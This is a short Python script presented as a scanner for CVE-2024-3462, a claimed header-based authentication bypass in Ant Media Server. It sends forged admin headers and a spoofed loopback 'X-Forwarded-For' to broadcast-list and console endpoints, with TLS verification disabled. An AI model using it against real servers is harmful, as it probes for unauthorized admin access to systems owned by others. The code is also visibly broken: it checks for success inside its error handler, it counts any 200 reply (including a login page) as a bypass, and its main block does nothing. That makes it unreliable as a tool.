#!/usr/bin/env python3
"""CVE-2024-3462: Ant Media Server HTTP Header Auth Bypass Scanner
CVSS: 5.4 MEDIUM | Manipulate X-Authorization / X-User headers"""
import urllib.request, ssl
from pathlib import Path

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

def probe(host, port=5000):
    """Test header-based auth bypass on admin endpoints."""
    bypass_headers = [
        {'X-Authorization': 'admin'}, {'X-User': 'admin'},
        {'X-Admin': 'true'}, {'Authorization': 'Bearer admin'},
        {'X-Forwarded-For': '127.0.0.1'},
    ]
    endpoints = ['/rest/v2/broadcasts/list', '/console/login', '/LiveApp/rest/v2/broadcasts/list']
    for ep in endpoints:
        for headers in bypass_headers:
            try:
                url = f"http://{host}:{port}{ep}"
                resp = urllib.request.urlopen(urllib.request.Request(url, headers=headers, method='GET'),
                    timeout=5, context=ctx)
                if resp.status == 200: return True
            except urllib.error.HTTPError as e:
                if e.code == 200: return True
            except Exception: pass
    return False

if __name__ == '__main__': import socket
